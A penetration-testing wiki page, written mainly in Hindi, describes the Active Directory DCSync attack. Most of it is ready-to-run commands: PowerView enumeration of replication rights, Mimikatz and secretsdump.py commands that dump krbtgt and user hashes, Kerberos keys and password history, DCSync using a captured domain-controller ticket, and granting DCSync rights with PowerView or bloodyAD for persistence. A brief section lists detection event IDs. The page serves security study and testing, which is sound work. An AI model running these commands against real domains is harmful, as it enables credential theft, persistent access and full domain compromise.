# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** permission का मतलब है कि domain पर आपके पास ये permissions हैं: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** और **Replicating Directory Changes In Filtered Set**।<sup>[[3]](#references)</sup>

**DCSync के बारे में ज़रूरी बातें:**

- **DCSync attack, Domain Controller के व्यवहार का अनुकरण करता है और Directory Replication Service Remote Protocol (MS-DRSR) का उपयोग करके अन्य Domain Controllers से जानकारी replicate करने के लिए कहता है।** चूंकि MS-DRSR, Active Directory का एक वैध और आवश्यक फ़ंक्शन है, इसलिए इसे बंद या disable नहीं किया जा सकता।
- Default रूप से केवल **Domain Admins, Enterprise Admins, Administrators, और Domain Controllers** groups के पास आवश्यक privileges होते हैं।
- व्यवहार में, **full DCSync** के लिए domain naming context पर **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** ज़रूरी हैं। `DS-Replication-Get-Changes-In-Filtered-Set` को आमतौर पर इनके साथ delegate किया जाता है, लेकिन अकेले यह full krbtgt dump की तुलना में **confidential / RODC-filtered attributes** (उदाहरण के लिए, पुराने LAPS-शैली के secrets) को sync करने के लिए ज़्यादा प्रासंगिक है।<sup>[[2]](#references)</sup>
- अगर किसी account के passwords reversible encryption के साथ store किए गए हैं, तो Mimikatz में password को clear text में दिखाने का विकल्प उपलब्ध है।

### Enumeration

`powerview` का उपयोग करके जाँचें कि इन permissions के साथ किसके पास access है:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

यदि आप DCSync अधिकार वाले **non-default principals** पर ध्यान देना चाहते हैं, तो अंतर्निर्मित replication-capable groups को फ़िल्टर करके केवल अप्रत्याशित trustees की समीक्षा करें:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### स्थानीय रूप से Exploit करें

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### दूरस्थ रूप से Exploit करें

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

व्यावहारिक, सीमित-दायरे के उदाहरण:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### captured DC machine TGT (ccache) का उपयोग करके DCSync

डोमेन कंट्रोलर पर किसी service की समीक्षा करते समय, उसकी local service identity और network identity में अंतर करें। [Microsoft दस्तावेज़](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) के अनुसार, SQL Server virtual accounts (`NT SERVICE\...`) network resources को host computer account के रूप में access करते हैं। डोमेन कंट्रोलर पर इससे DC machine account replication-rights की समीक्षा के लिए प्रासंगिक हो सकता है, लेकिन केवल service foothold होने से यह साबित नहीं होता कि export किया जा सकने वाला machine TGT मौजूद है या DCSync के लिए usable authentication उपलब्ध है। इसे path मानने से पहले वास्तविक service identity, outbound authentication context, उपलब्ध ticket या credentials, और प्रभावी replication rights की पुष्टि करें।

unconstrained-delegation export-mode scenarios में, आप Domain Controller machine TGT (जैसे, `krbtgt@DOMAIN` के लिए `DC1$@DOMAIN`) capture कर सकते हैं। इसके बाद, आप password के बिना DC के रूप में authenticate करने और DCSync करने के लिए उस ccache का उपयोग कर सकते हैं।<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Operational notes:

- **Impacket का Kerberos path** DRSUAPI call से पहले **SMB** को छूता है। अगर environment में **SPN target name validation** लागू है, तो full dump विफल हो सकता है: `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- ऐसे में, पहले target DC के लिए **`cifs/<dc>`** service ticket माँगें या जिस account की तुरंत ज़रूरत है, उसके लिए **`-just-dc-user`** का उपयोग करें।
- जब आपके पास केवल कम replication rights हों, तब भी LDAP/DirSync-style syncing से **confidential** या **RODC-filtered** attributes (उदाहरण के लिए legacy `ms-Mcs-AdmPwd`) सामने आ सकते हैं, बिना पूरी krbtgt replication के।<sup>[[2]](#references)</sup>

`-just-dc` 3 files बनाता है:

- एक में **NTLM hashes**
- एक में **Kerberos keys**
- एक में NTDS से उन accounts के cleartext passwords होते हैं जिनके लिए [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled है। आप reversible encryption वाले users इस तरह पा सकते हैं:

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistence

यदि आप domain admin हैं, तो PowerView की मदद से ये permissions किसी भी user को दे सकते हैं:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Linux ऑपरेटर `bloodyAD` के साथ भी ऐसा कर सकते हैं:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

फिर, आप इसके आउटपुट में देखकर **जाँच सकते हैं कि user को तीनों privileges सही ढंग से असाइन किए गए थे या नहीं** (आपको "ObjectType" फ़ील्ड में privileges के नाम दिखाई देने चाहिए):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### शमन

- Security Event ID 4662 (ऑब्जेक्ट के लिए Audit Policy सक्षम होनी चाहिए) – किसी ऑब्जेक्ट पर ऑपरेशन किया गया<sup>[[4]](#references)</sup>
- Security Event ID 5136 (ऑब्जेक्ट के लिए Audit Policy सक्षम होनी चाहिए) – Directory Service ऑब्जेक्ट में बदलाव किया गया
- Security Event ID 4670 (ऑब्जेक्ट के लिए Audit Policy सक्षम होनी चाहिए) – किसी ऑब्जेक्ट की Permissions बदली गईं
- AD ACL Scanner - ACLs की रिपोर्ट बनाएँ और उनकी तुलना करें। [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Replication Get-Changes और Get-Changes-In-Filtered-Set का लाभ उठाना](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Domain Controller से Password Hashes डंप करना](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DA तक DCSync](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
